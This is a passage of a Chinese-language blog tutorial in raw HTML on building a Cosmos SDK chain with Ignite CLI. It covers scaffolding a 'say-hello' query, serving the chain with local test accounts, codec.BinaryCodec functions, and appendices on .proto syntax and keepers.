id=\"创建一个新的链\">3.1 创建一个新的链</h2>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">ignite scaffold chain hello</span><br><span class=\"line\"><span class=\"built_in\">cd</span> hello</span><br></pre></td></tr></table></figure>\n<h2 id=\"生成查询代码\">3.2 生成查询代码</h2>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ignite scaffold query say-hello name --response name</span></span><br><span class=\"line\"></span><br><span class=\"line\">modify proto/hello/hello/query.proto</span><br><span class=\"line\">create x/hello/keeper/query_say_hello.go</span><br><span class=\"line\">modify x/hello/module/autocli.go</span><br><span class=\"line\"></span><br><span class=\"line\">🎉 Created a query `say-hello`.</span><br></pre></td></tr></table></figure>\n<p>此命令会为一个新的查询 <code>say-hello</code> 生成代码，该查询接受\n<code>name</code> 作为输入，并将它返回在响应中。</p>\n<p><strong>生成的代码</strong>：</p>\n<ul>\n<li><code>proto/hello/hello/query.proto</code>：定义请求和响应结构。</li>\n<li><code>x/hello/module/autocli.go</code>：包含查询的 CLI 命令。</li>\n<li><code>x/hello/keeper/query_say_hello.go</code>：存放查询响应的逻辑。</li>\n</ul>\n<h3 id=\"proto\">3.2.1 proto</h3>\n<p>增加了一个查询接口：</p>\n<figure class=\"highlight protobuf\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Queries a list of SayHello items.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">rpc</span> SayHello (QuerySayHelloRequest) <span class=\"keyword\">returns</span> (QuerySayHelloResponse) </span>{</span><br><span class=\"line\">\t<span class=\"keyword\">option</span> (google.api.http).get = <span class=\"string\">\"/hello/hello/say_hello/{name}\"</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">message </span><span class=\"title class_\">QuerySayHelloRequest</span> {</span><br><span class=\"line\">  <span class=\"type\">string</span> name = <span class=\"number\">1</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">message </span><span class=\"title class_\">QuerySayHelloResponse</span> {</span><br><span class=\"line\">  <span class=\"type\">string</span> name = <span class=\"number\">1</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<h3 id=\"cli\">3.2.2 cli</h3>\n<p>新增了一个请求接口，但是没有包括具体实现代码，应该是封装进 Cosmos SDK\n中的 autocliv1 了。</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\">Query: &amp;autocliv1.ServiceCommandDescriptor{</span><br><span class=\"line\">    Service: modulev1.Query_ServiceDesc.ServiceName,</span><br><span class=\"line\">    RpcCommandOptions: []*autocliv1.RpcCommandOptions{</span><br><span class=\"line\">        {</span><br><span class=\"line\">            RpcMethod: <span class=\"string\">\"Params\"</span>,</span><br><span class=\"line\">            Use:       <span class=\"string\">\"params\"</span>,</span><br><span class=\"line\">            Short:     <span class=\"string\">\"Shows the parameters of the module\"</span>,</span><br><span class=\"line\">        },</span><br><span class=\"line\">        {</span><br><span class=\"line\">            RpcMethod:      <span class=\"string\">\"SayHello\"</span>,</span><br><span class=\"line\">            Use:            <span class=\"string\">\"say-hello [name]\"</span>,</span><br><span class=\"line\">            Short:          <span class=\"string\">\"Query say-hello\"</span>,</span><br><span class=\"line\">            PositionalArgs: []*autocliv1.PositionalArgDescriptor{{ProtoField: <span class=\"string\">\"name\"</span>}},</span><br><span class=\"line\">        },</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// this line is used by ignite scaffolding # autocli/query</span></span><br><span class=\"line\">    },</span><br><span class=\"line\">},</span><br></pre></td></tr></table></figure>\n<h3 id=\"keeper\">3.2.3 keeper</h3>\n<p>新增了 <code>query_say_hello.go</code> 文件：</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> keeper</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> (</span><br><span class=\"line\">    <span class=\"string\">\"context\"</span></span><br><span class=\"line\">    <span class=\"string\">\"fmt\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"string\">\"hello/x/hello/types\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">    sdk <span class=\"string\">\"github.com/cosmos/cosmos-sdk/types\"</span></span><br><span class=\"line\">    <span class=\"string\">\"google.golang.org/grpc/codes\"</span></span><br><span class=\"line\">    <span class=\"string\">\"google.golang.org/grpc/status\"</span></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"params\">(q queryServer)</span></span> SayHello(ctx context.Context, req *types.QuerySayHelloRequest) (*types.QuerySayHelloResponse, <span class=\"type\">error</span>) {</span><br><span class=\"line\">    <span class=\"keyword\">if</span> req == <span class=\"literal\">nil</span> {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">nil</span>, status.Error(codes.InvalidArgument, <span class=\"string\">\"invalid request\"</span>)</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 验证和上下文解包</span></span><br><span class=\"line\">    ctx := sdk.UnwrapSDKContext(ctx)</span><br><span class=\"line\"></span><br><span class=\"line\">    _ = ctx</span><br><span class=\"line\">    <span class=\"comment\">// 自定义响应</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> &amp;types.QuerySayHelloResponse{Name: fmt.Sprintf(<span class=\"string\">\"Hello %s!\"</span>, req.Name)}, <span class=\"literal\">nil</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"自定义查询响应\">3.3 自定义查询响应</h2>\n<p>修改 <code>query_say_hello.go</code>：</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"params\">(k Keeper)</span></span> SayHello(goCtx context.Context, req *types.QuerySayHelloRequest) (*types.QuerySayHelloResponse, <span class=\"type\">error</span>) {</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> req == <span class=\"literal\">nil</span> {</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">nil</span>, status.Error(codes.InvalidArgument, <span class=\"string\">\"invalid request\"</span>)</span><br><span class=\"line\">\t}</span><br><span class=\"line\"></span><br><span class=\"line\">\tctx := sdk.UnwrapSDKContext(goCtx)</span><br><span class=\"line\"></span><br><span class=\"line\">\t_ = ctx</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> &amp;types.QuerySayHelloResponse{Name: fmt.Sprintf(<span class=\"string\">\"Hello %s!\"</span>, req.Name)}, <span class=\"literal\">nil</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<h2 id=\"启动区块链并测试\">3.4 启动区块链并测试</h2>\n<p><strong>启动区块链</strong>：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ignite chain serve</span></span><br><span class=\"line\"></span><br><span class=\"line\">  Blockchain is running</span><br><span class=\"line\"></span><br><span class=\"line\">  Blockchain is running</span><br><span class=\"line\"></span><br><span class=\"line\">  Blockchain is running</span><br><span class=\"line\">  </span><br><span class=\"line\">  ✔ Added account alice with address cosmos1h2tqat8zme35fmkvk7yhp6r7r54edkg8eg0x43 and mnemonic:</span><br><span class=\"line\">  coffee coffee female clap cake kind pledge lamp give lens accuse reopen captain poverty program reward music trust transfer ski heavy husband </span><br><span class=\"line\">  </span><br><span class=\"line\">  ✔ Added account bob with address cosmos1g7eamf74zkg629sd8wc0hdj88sqas8pfgrga7l and mnemonic:</span><br><span class=\"line\">  deputy fix marble merge toy rice traffic <span class=\"built_in\">wait</span> wife arrive laptop injury twelve doll shrimp guilt issue ripple position cereal width consider s</span><br><span class=\"line\">  </span><br><span class=\"line\">  🌍 Tendermint node: http://0.0.0.0:26657</span><br><span class=\"line\">  🌍 Blockchain API: http://0.0.0.0:1317</span><br><span class=\"line\">  🌍 Token faucet: http://0.0.0.0:4500</span><br><span class=\"line\">  </span><br><span class=\"line\">  ⋆ Data directory: /root/.hello</span><br><span class=\"line\">  ⋆ App binary: /root/go/bin/hellod</span><br><span class=\"line\">  </span><br><span class=\"line\">  Press the <span class=\"string\">'q'</span> key to stop serve</span><br></pre></td></tr></table></figure>\n<p><strong>运行测试</strong>：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># cd /root/go/bin/hellod</span></span><br><span class=\"line\"><span class=\"comment\"># ./hellod q hello say-hello world</span></span><br><span class=\"line\">name: Hello world!</span><br></pre></td></tr></table></figure>\n<h1 id=\"博客增删改查\">4 博客（增删改查）</h1>\n<p>https://docs.ignite.com/guide/blog</p>\n<p>不细写了，直接看原文吧，底下记录一点关键代码。</p>\n<h2 id=\"ignite-参数类型\">4.1 Ignite 参数类型</h2>\n<blockquote>\n<p>Ignite CLI 支持在 Cosmos SDK\n区块链中定义多种数据类型，以下是常用的数据类型：</p>\n<p><strong>基本数据类型</strong></p>\n<ul>\n<li><strong><code>string</code></strong>：字符串类型，用于存储文本。</li>\n<li><strong><code>bool</code></strong>：布尔类型，值为 <code>true</code>\n或 <code>false</code>。</li>\n<li><strong><code>int</code></strong>：有符号整数类型，用于存储整数值。</li>\n<li><strong><code>uint</code></strong>：无符号整数类型，只能存储非负整数。</li>\n<li><strong><code>int64</code> / <code>uint64</code></strong>：64\n位的有符号和无符号整数，适合存储较大的整数值。</li>\n</ul>\n<p><strong>数值类型</strong></p>\n<ul>\n<li><strong><code>float</code></strong>：浮点数类型，用于存储小数。</li>\n<li><strong><code>float32</code> / <code>float64</code></strong>：32\n位和 64 位浮点数类型，分别提供不同的精度。</li>\n</ul>\n<p><strong>数组和列表类型</strong></p>\n<ul>\n<li><strong><code>[]&lt;type&gt;</code></strong>：泛型数组类型，用于存储指定类型的多个值。例如，<code>[]string</code>\n表示字符串数组，<code>[]uint64</code> 表示无符号整数数组。</li>\n</ul>\n<p><strong>特殊类型</strong></p>\n<ul>\n<li><strong><code>sdk.Coin</code></strong>：用于表示 Cosmos SDK\n中的代币（coin）类型。代币包含数量和单位（例如\n<code>100atom</code>），用于表示特定数量的原生代币。</li>\n<li><strong><code>sdk.Coins</code></strong>：表示多个代币，用于处理不同类型的资产组合。</li>\n</ul>\n<p><strong>自定义类型</strong></p>\n<ul>\n<li><strong>枚举类型（enums）</strong>：通过定义特定的字符串或整数值集合，用于表示具有有限可能值的数据。</li>\n<li><strong>时间类型（<code>time.Time</code>）</strong>：用于存储日期和时间，通常在\nCosmos SDK 项目中用于处理区块时间戳或事件时间。</li>\n</ul>\n<p><strong>复杂结构类型</strong></p>\n<ul>\n<li><strong>结构体（structs）</strong>：可以定义复杂的数据结构，包含多个字段，适用于具有多个属性的数据类型。</li>\n</ul>\n<p>这些数据类型提供了灵活的数据建模能力，支持开发者根据需要定义区块链的存储和处理需求。Ignite\nCLI 会根据指定的数据类型自动生成相关的代码、查询和接口。</p>\n</blockquote>\n<h2 id=\"codec.binarycodeccdc\">4.2 codec.BinaryCodec（cdc）</h2>\n<p><code>codec.BinaryCodec</code> 是 Cosmos SDK\n中用于数据编码和解码的接口。该接口包含一系列常用的函数，用于序列化（编码）和反序列化（解码）数据结构，以便进行存储、传输或模块间的数据交换。以下是\n<code>BinaryCodec</code> 接口中常用的函数及其作用：</p>\n<ol type=\"1\">\n<li><p><strong>MarshalBinaryBare</strong></p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\">MarshalBinaryBare(o <span class=\"keyword\">interface</span>{}) ([]<span class=\"type\">byte</span>, <span class=\"type\">error</span>)</span><br></pre></td></tr></table></figure>\n<ul>\n<li><strong>作用</strong>：将数据结构 <code>o</code>\n编码为二进制格式。</li>\n<li><strong>使用场景</strong>：当需要将结构化数据（如消息、状态）存储到数据库或进行网络传输时，可以调用该函数进行序列化。</li>\n<li><strong>注意</strong>：<code>MarshalBinaryBare</code>\n通常用于内部存储，因为它不包含附加元数据（例如字段的类型信息），编码效率较高。</li>\n</ul></li>\n<li><p><strong>UnmarshalBinaryBare</strong></p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\">UnmarshalBinaryBare(bz []<span class=\"type\">byte</span>, ptr <span class=\"keyword\">interface</span>{}) <span class=\"type\">error</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li><strong>作用</strong>：将二进制数据 <code>bz</code>\n解码为结构化数据，并将结果存储在指针 <code>ptr</code>\n指向的变量中。</li>\n<li><strong>使用场景</strong>：当从数据库或网络中获取到二进制数据并需要还原为原始结构时使用该函数。</li>\n<li><strong>注意</strong>：该函数必须知道数据的具体类型，通常在解码前已经知道数据结构的类型。</li>\n</ul></li>\n<li><p><strong>MarshalBinaryLengthPrefixed</strong></p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\">MarshalBinaryLengthPrefixed(o <span class=\"keyword\">interface</span>{}) ([]<span class=\"type\">byte</span>, <span class=\"type\">error</span>)</span><br></pre></td></tr></table></figure>\n<ul>\n<li><strong>作用</strong>：将数据结构 <code>o</code>\n编码为带有长度前缀的二进制格式。</li>\n<li><strong>使用场景</strong>：带长度前缀的二进制格式在传输时可以明确表示数据的边界，常用于网络通信和日志记录。</li>\n<li><strong>优势</strong>：长度前缀提供了更好的数据包分割管理，可用于防止数据被截断或破坏。</li>\n</ul></li>\n<li><p><strong>UnmarshalBinaryLengthPrefixed</strong></p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\">UnmarshalBinaryLengthPrefixed(bz []<span class=\"type\">byte</span>, ptr <span class=\"keyword\">interface</span>{}) <span class=\"type\">error</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li><strong>作用</strong>：将带有长度前缀的二进制数据 <code>bz</code>\n解码为结构化数据，并将结果存储在指针 <code>ptr</code>\n指向的变量中。</li>\n<li><strong>使用场景</strong>：从网络流或文件中读取带有长度前缀的二进制数据，并还原为结构化数据时使用。</li>\n</ul></li>\n<li><p><strong>MarshalJSON</strong></p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\">MarshalJSON(o <span class=\"keyword\">interface</span>{}) ([]<span class=\"type\">byte</span>, <span class=\"type\">error</span>)</span><br></pre></td></tr></table></figure>\n<ul>\n<li><strong>作用</strong>：将数据结构 <code>o</code> 编码为 JSON\n格式的字节切片。</li>\n<li><strong>使用场景</strong>：当需要将数据以 JSON\n格式与外部系统或前端交互时使用，便于人类阅读和调试。</li>\n<li><strong>优势</strong>：JSON\n是一种通用格式，易于调试，适用于对外提供的 API 接口。</li>\n</ul></li>\n<li><p><strong>UnmarshalJSON</strong></p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\">UnmarshalJSON(bz []<span class=\"type\">byte</span>, ptr <span class=\"keyword\">interface</span>{}) <span class=\"type\">error</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li><strong>作用</strong>：将 JSON 格式的字节切片 <code>bz</code>\n解码为结构化数据，并将结果存储在指针 <code>ptr</code>\n指向的变量中。</li>\n<li><strong>使用场景</strong>：从外部系统或用户接口接收到 JSON\n数据并需要解析为结构化数据时使用。</li>\n</ul></li>\n<li><p><strong>MustMarshalBinaryBare</strong></p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\">MustMarshalBinaryBare(o <span class=\"keyword\">interface</span>{}) []<span class=\"type\">byte</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li><strong>作用</strong>：将数据结构 <code>o</code>\n编码为二进制格式，与 <code>MarshalBinaryBare</code>\n类似，但若编码出错则直接触发 <code>panic</code>。</li>\n<li><strong>使用场景</strong>：在对编码错误容忍度较低的场景中使用，如编码错误几乎不可能发生时使用，简化代码结构。</li>\n</ul></li>\n<li><p><strong>MustUnmarshalBinaryBare</strong></p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\">MustUnmarshalBinaryBare(bz []<span class=\"type\">byte</span>, ptr <span class=\"keyword\">interface</span>{})</span><br></pre></td></tr></table></figure>\n<ul>\n<li><strong>作用</strong>：将二进制数据 <code>bz</code>\n解码为结构化数据，与 <code>UnmarshalBinaryBare</code>\n类似，但若解码出错则直接触发 <code>panic</code>。</li>\n<li><strong>使用场景</strong>：在确定数据不会出错的情况下简化代码，减少错误处理代码的写法。</li>\n</ul></li>\n<li><p><strong>MustMarshalJSON</strong></p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\">MustMarshalJSON(o <span class=\"keyword\">interface</span>{}) []<span class=\"type\">byte</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li><strong>作用</strong>：将数据结构 <code>o</code> 编码为 JSON\n格式，若编码出错则直接触发 <code>panic</code>。</li>\n<li><strong>使用场景</strong>：在高置信度场景中快速编码 JSON\n数据，而无需处理编码错误。</li>\n</ul></li>\n<li><p><strong>MustUnmarshalJSON</strong></p></li>\n</ol>\n<p><figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\">MustUnmarshalJSON(bz []<span class=\"type\">byte</span>, ptr <span class=\"keyword\">interface</span>{})</span><br></pre></td></tr></table></figure> - <strong>作用</strong>：将 JSON 字节切片\n<code>bz</code> 解码为结构化数据，若解码出错则直接触发\n<code>panic</code>。 - <strong>使用场景</strong>：在确定 JSON\n数据格式正确的场景下，减少错误处理逻辑。</p>\n<p><code>codec.BinaryCodec</code>\n提供了一套完整的数据序列化和反序列化方法，适用于二进制、JSON\n等不同编码格式。常用的函数包括带有或不带长度前缀的二进制编码和解码、JSON\n编码和解码，以及支持 <code>panic</code>\n的编码/解码版本。选择具体函数时，可以根据数据格式要求、错误处理需求和应用场景来使用这些编码和解码函数。</p>\n<p>直接使用 <code>MustMarshal</code> (不加后缀指定类型)\n会根据具体实现自动选择二进制编码或 JSON 编码，开发者无需显式指定。</p>\n<h1 id=\"附录\">附录</h1>\n<h2 id=\"proto-简要教程\">proto 简要教程</h2>\n<p>一个 <code>.proto</code> 文件用于定义协议缓冲区（Protocol\nBuffers）的消息和服务结构，主要包含以下几部分：</p>\n<h3 id=\"语法声明syntax-declaration\">1. <strong>语法声明（Syntax\nDeclaration）</strong></h3>\n<p><figure class=\"highlight proto\"><table><tr><td class=\"code\"><pre><span class=\"line\">syntax = <span class=\"string\">\"proto3\"</span>;</span><br></pre></td></tr></table></figure> - 这行代码指定使用 <code>proto3</code>\n语法版本。<code>proto3</code> 是 Protocol Buffers 的最新版本，相比\n<code>proto2</code>，简化了一些规则和功能（例如，移除了可选字段默认值等）。</p>\n<h3 id=\"包声明package-declaration\">2. <strong>包声明（Package\nDeclaration）</strong></h3>\n<p><figure class=\"highlight proto\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> example;</span><br></pre></td></tr></table></figure> - 声明了 <code>.proto</code>\n文件所属的包。包名用于组织代码结构，避免命名冲突。在生成代码时，这个包名会映射到目标语言中的命名空间，例如在\nGo 中会生成相应的 <code>package</code>。</p>\n<h3 id=\"导入imports\">3. <strong>导入（Imports）</strong></h3>\n<p><figure class=\"highlight proto\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">\"google/protobuf/timestamp.proto\"</span>;</span><br></pre></td></tr></table></figure> - 用于引入其他 <code>.proto</code>\n文件，重用其中定义的消息或服务。比如\n<code>google/protobuf/timestamp.proto</code> 提供了\n<code>Timestamp</code>\n类型，用于表示时间戳。导入的文件可以是标准库文件或用户自定义文件。</p>\n<h3 id=\"消息定义message-definition\">4. <strong>消息定义（Message\nDefinition）</strong></h3>\n<p><figure class=\"highlight proto\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">message </span><span class=\"title class_\">ExampleMessage</span> {</span><br><span class=\"line\">    <span class=\"type\">int32</span> id = <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"type\">string</span> name = <span class=\"number\">2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">repeated</span> <span class=\"type\">string</span> tags = <span class=\"number\">3</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure> - <code>message</code> 定义了数据结构，每个\n<code>message</code>\n相当于一个对象或结构体。消息中包含字段，每个字段都有类型、名称和唯一的标签编号。\n- 字段的标签编号（如\n<code>id = 1</code>）用于在序列化数据时标识字段，确保消息的兼容性。不同类型字段的作用：\n- <code>int32</code>、<code>string</code> 等基本类型。 -\n<code>repeated</code> 表示数组或列表，可以包含多个相同类型的元素。</p>\n<h3 id=\"服务定义service-definition\">5. <strong>服务定义（Service\nDefinition）</strong></h3>\n<p><figure class=\"highlight proto\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">service </span><span class=\"title class_\">ExampleService</span> {</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">rpc</span> GetExample (ExampleRequest) <span class=\"keyword\">returns</span> (ExampleResponse)</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure> - 定义服务接口，类似于定义 API\n的端点。<code>service</code> 内部包含一组 RPC\n方法，用于客户端和服务器之间的远程过程调用。 - 每个 RPC\n方法指定请求和响应的消息类型（如 <code>ExampleRequest</code> 和\n<code>ExampleResponse</code>），定义了客户端调用该方法时需要的输入和返回的输出。</p>\n<h3 id=\"枚举类型enum-definition\">6. <strong>枚举类型（Enum\nDefinition）</strong></h3>\n<p><figure class=\"highlight proto\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">enum </span><span class=\"title class_\">Status</span> {</span><br><span class=\"line\">    UNKNOWN = <span class=\"number\">0</span>;</span><br><span class=\"line\">    ACTIVE = <span class=\"number\">1</span>;</span><br><span class=\"line\">    INACTIVE = <span class=\"number\">2</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure> -\n定义枚举类型，提供一组命名常量。每个枚举值都有一个编号，通常从\n<code>0</code>\n开始。这些常量可以在消息中用作字段的值，用于表示一组有限的选项或状态。</p>\n<h3 id=\"示例-.proto-文件结构\">示例 <code>.proto</code> 文件结构</h3>\n<figure class=\"highlight proto\"><table><tr><td class=\"code\"><pre><span class=\"line\">syntax = <span class=\"string\">\"proto3\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">package</span> example;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">\"google/protobuf/timestamp.proto\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">message </span><span class=\"title class_\">ExampleRequest</span> {</span><br><span class=\"line\">    <span class=\"type\">int32</span> id = <span class=\"number\">1</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">message </span><span class=\"title class_\">ExampleResponse</span> {</span><br><span class=\"line\">    <span class=\"type\">string</span> message = <span class=\"number\">1</span>;</span><br><span class=\"line\">    google.protobuf.Timestamp timestamp = <span class=\"number\">2</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">enum </span><span class=\"title class_\">Status</span> {</span><br><span class=\"line\">    UNKNOWN = <span class=\"number\">0</span>;</span><br><span class=\"line\">    ACTIVE = <span class=\"number\">1</span>;</span><br><span class=\"line\">    INACTIVE = <span class=\"number\">2</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">service </span><span class=\"title class_\">ExampleService</span> {</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">rpc</span> GetExample (ExampleRequest) <span class=\"keyword\">returns</span> (ExampleResponse)</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<h3 id=\"总结\">总结</h3>\n<p><strong>Protocol Buffers（.proto 文件）</strong>\n是一种与语言无关、平台无关的序列化数据结构定义方式，主要用于定义复杂的数据实体以及服务接口。虽然它在\nGo 中非常常用，但它并不局限于 Go，其他语言（如\nPython、Java、C++）也可以通过 <code>.proto</code>\n文件生成相应的数据结构和代码。</p>\n<p>在 Go 中，<code>.proto</code> 文件通常用来定义以下内容：</p>\n<ol type=\"1\">\n<li><strong>数据结构</strong>：定义复杂的数据实体（<code>message</code>），包含字段类型和序号，用于跨网络传输和存储。</li>\n<li><strong>服务接口</strong>：定义 gRPC\n服务（<code>service</code>），包含可调用的 RPC\n方法，规定了请求和响应类型，使不同服务之间能够进行 RPC 通信。</li>\n</ol>\n<p>因此，<code>.proto</code>\n文件的作用不仅仅是定义数据结构，还可以定义服务接口，使得不同服务之间能够高效通信。</p>\n<h2 id=\"keeper-1\">Keeper</h2>\n<p>在 Cosmos SDK 的项目结构中，<code>keeper</code>\n文件夹主要负责模块内部的核心业务逻辑和状态管理。<code>keeper</code>\n是每个 Cosmos SDK\n模块的重要组件，它封装了模块的数据访问和操作逻辑，确保数据的读取和写入是安全且一致的。以下是\n<code>keeper</code> 文件夹的主要内容：</p>\n<h3 id=\"keeper-结构体\">1. <strong>Keeper 结构体</strong></h3>\n<ul>\n<li><code>keeper</code> 文件夹通常包含一个 <code>Keeper</code>\n结构体，该结构体负责管理模块的状态、配置和依赖。它通常包含一些存储的引用、其他模块的接口以及上下文，方便模块与\nCosmos SDK 的其他部分进行交互。</li>\n<li>典型的 <code>Keeper</code>\n结构体定义会包含模块的存储器（store）、上下文（context）、其他模块的引用等，确保模块之间的数据可以安全地访问和修改。</li>\n</ul>\n<p><figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">type</span> Keeper <span class=\"keyword\">struct</span> {</span><br><span class=\"line\">    storeKey   sdk.StoreKey</span><br><span class=\"line\">    cdc        codec.BinaryCodec</span><br><span class=\"line\">    bankKeeper types.BankKeeper</span><br><span class=\"line\">    <span class=\"comment\">// 其他依赖</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"构造函数\">2. <strong>构造函数</strong></h3>\n<ul>\n<li><code>keeper</code> 文件夹中通常会定义一个构造函数，用于初始化\n<code>Keeper</code>\n结构体。构造函数会接受必要的依赖（如存储键、编码器和其他模块的\nkeeper），并将其赋值给 <code>Keeper</code> 结构体。</li>\n<li>通过构造函数，模块可以确保在创建时正确配置并提供所有依赖关系。</li>\n</ul>\n<p><figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">NewKeeper</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    cdc codec.BinaryCodec,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    key sdk.StoreKey,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    bankKeeper types.BankKeeper,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    // 其他依赖</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">)</span></span> Keeper {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Keeper{</span><br><span class=\"line\">        storeKey: key,</span><br><span class=\"line\">        cdc:      cdc,</span><br><span class=\"line\">        bankKeeper: bankKeeper,</span><br><span class=\"line\">        <span class=\"comment\">// 其他赋值</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"查询逻辑\">3. <strong>查询逻辑</strong></h3>\n<ul>\n<li><code>keeper</code>\n文件夹包含查询函数，用于处理模块的自定义查询请求。这些函数通过\n<code>gRPC</code> 和 <code>CLI</code>\n接口向外部提供模块数据的查询。</li>\n<li>查询函数会接受上下文和请求参数，访问状态存储，并返回响应。这些函数一般位于\n<code>query_xxx.go</code> 文件中，例如\n<code>query_say_hello.go</code>。</li>\n</ul>\n<p><figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"params\">(k Keeper)</span></span> SayHello(ctx context.Context, req *types.QuerySayHelloRequest) (*types.QuerySayHelloResponse, <span class=\"type\">error</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// 实现查询逻辑</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> &amp;types.QuerySayHelloResponse{Name: <span class=\"string\">\"Hello Cosmos\"</span>}, <span class=\"literal\">nil</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"消息处理逻辑\">4. <strong>消息处理逻辑</strong></h3>\n<ul>\n<li><code>keeper</code>\n文件夹中还包含模块的消息处理逻辑。消息是模块对区块链状态进行操作的主要手段。每个消息处理函数都会在\n<code>keeper</code> 中实现，并且通常会在 <code>msg_xxx.go</code>\n文件中定义。</li>\n<li>消息处理函数通过接收请求参数和上下文执行特定的状态更改，如更新账户余额、修改参数等。</li>\n</ul>\n<p><figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"params\">(k Keeper)</span></span> HandleMsgSend(ctx sdk.Context, msg *types.MsgSend) (*types.MsgSendResponse, <span class=\"type\">error</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// 实现消息处理逻辑</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> &amp;types.MsgSendResponse{}, <span class=\"literal\">nil</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"状态管理\">5. 